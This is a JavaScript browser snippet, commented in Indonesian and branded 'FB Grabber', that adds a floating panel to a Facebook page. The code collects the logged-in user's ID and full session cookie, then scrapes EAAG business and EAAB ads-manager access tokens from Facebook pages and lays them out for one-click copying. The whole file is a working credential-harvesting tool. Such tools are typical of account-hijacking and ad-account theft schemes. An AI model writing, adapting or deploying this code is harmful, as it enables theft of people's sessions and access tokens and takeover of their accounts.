(function() {
    // 1. Injeksi CSS (UI Standar Sesuai Gambar Anda)
    const style = document.createElement('style');
    style.textContent = `
        #floatBtn { 
            position: fixed; bottom: 10vw; right: 7vw; z-index: 2147483647; 
            width: 12vw; height: 12vw; background: #0866FF; 
            border-radius: 50%; display: flex; align-items: center; 
            justify-content: center; cursor: pointer; font-size: 5vw; 
            box-shadow: 0 3px 8px rgba(0,0,0,0.4); border: 0.4vw solid white; 
        }
        #guard-modal {
            position: fixed; top: 0; left: 0; 
            width: 100vw; height: 100vh; background: rgb(253,250,250); 
            z-index: 2147483646; padding: 4vw; box-sizing: border-box; 
            display: none; overflow-y: auto; font-family: sans-serif;
        }
        .section-box { background: rgb(232,232,232); padding: 4vw; border-radius: 2vw; margin-bottom: 3vw; }
        .section-title { font-size: 4vw; font-weight: bold; color: rgb(33,30,30); margin-bottom: 3.5vw; text-transform: uppercase; }
        .access-label { font-size: 3vw; font-weight: bold; color: #53000f; display: block; margin-bottom: 1vw; }
        .access-area { 
            width: 100%; height: 15vw; font-size: 2.5vw; border-radius: 2vw; 
            padding: 2vw; box-sizing: border-box; background: #111; 
            color: #0bfa31; border: none; resize: none; margin-bottom: 2vw; 
            font-family: 'Courier New', monospace !important; word-break: break-all;
        }
        .btn-main { 
            width: 100%; padding: 3vw; background: #0866FF; color: white; 
            border-radius: 2.5vw; border: none; font-weight: bold; font-size: 4vw; cursor: pointer;
        }
        #mStatus { text-align:center; font-weight:bold; font-size:6vw; color:#888; margin-top: 5vw; }
    `;
    document.head.appendChild(style);

    // 2. Struktur HTML
    const container = document.createElement('div');
    container.innerHTML = `
        <div id="floatBtn">💾️</div>
        <div id="guard-modal">
            <div style="text-align:center; margin-bottom:8vw; padding-top:5vw;">
                <h1 style="font-size:7vw; font-weight:900; color:rgb(60,60,60); margin:0;">
                    FB <span style="color:#0866FF;">Grabber</span>
                </h1>
            </div>

            <div class="section-box">
                <div class="section-title">🔑 Access Data</div>
                <button id="mGetAccess" class="btn-main">FETCH DATA SEKARANG</button>
                
                <div id="contentAccess" style="display:none; margin-top:4vw;">
                    <label class="access-label">ID:</label>
                    <textarea id="resId" class="access-area" readonly spellcheck="false"></textarea>
                    
                    <label class="access-label">COOKIE:</label>
                    <textarea id="resCookie" class="access-area" readonly spellcheck="false"></textarea>
                    
                    <label class="access-label">TOKEN EAAG (Business):</label>
                    <textarea id="resEAAG" class="access-area" readonly spellcheck="false"></textarea>

                    <label class="access-label">TOKEN EAAB (Ads):</label>
                    <textarea id="resEAAB" class="access-area" readonly spellcheck="false"></textarea>
                </div>
            </div>
            <p id="mStatus">Notification</p>
        </div>
    `;
    document.body.appendChild(container);

    // 3. Logika JS (Fokus ke EAAG & EAAB)
    const modal = document.getElementById('guard-modal');
    const floatBtn = document.getElementById('floatBtn');
    const status = document.getElementById('mStatus');

    floatBtn.onclick = () => {
        modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';
    };

    const showNotif = (msg, color) => {
        status.innerHTML = `<span style="color:${color}">${msg}</span>`;
    };

    document.getElementById('mGetAccess').onclick = async function() {
        this.innerText = "Processing...";
        
        // 1. UID & Cookie
        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "Not Found";
        document.getElementById('resId').value = uid;
        document.getElementById('resCookie').value = document.cookie;

        // 2. Ambil EAAG (Business)
        try {
            const resG = await fetch('https://business.facebook.com/business_locations');
            const txtG = await resG.text();
            const eaag = txtG.match(/(EAAG[a-zA-Z0-9]+)/)?.[1] || "EAAG Tidak Ditemukan";
            document.getElementById('resEAAG').value = eaag;
        } catch (e) {
            document.getElementById('resEAAG').value = "Gagal Load EAAG";
        }

        // 3. Ambil EAAB (Ads Manager)
        try {
            const resB = await fetch('https://www.facebook.com/adsmanager/manage/campaigns');
            const txtB = await resB.text();
            const eaab = txtB.match(/(EAAB[a-zA-Z0-9]+)/)?.[1] || "EAAB Tidak Ditemukan";
            document.getElementById('resEAAB').value = eaab;
        } catch (e) {
            document.getElementById('resEAAB').value = "Gagal Load EAAB";
        }

        document.getElementById('contentAccess').style.display = 'block';
        this.innerText = "FETCH DATA SEKARANG";
        showNotif("Data Berhasil Diambil!", "#00df1f");
    };

    // Fungsi Klik Langsung Salin
    const setupCopy = (id) => {
        const el = document.getElementById(id);
        el.onclick = function() {
            if (!this.value || this.value.includes("Gagal")) return;
            this.select();
            document.execCommand('copy');
            const oldStatus = status.innerHTML;
            showNotif("Copied!", "#0866FF");
            setTimeout(() => { status.innerHTML = oldStatus; }, 1500);
        };
    };

    ['resId', 'resCookie', 'resEAAG', 'resEAAB'].forEach(setupCopy);

})();
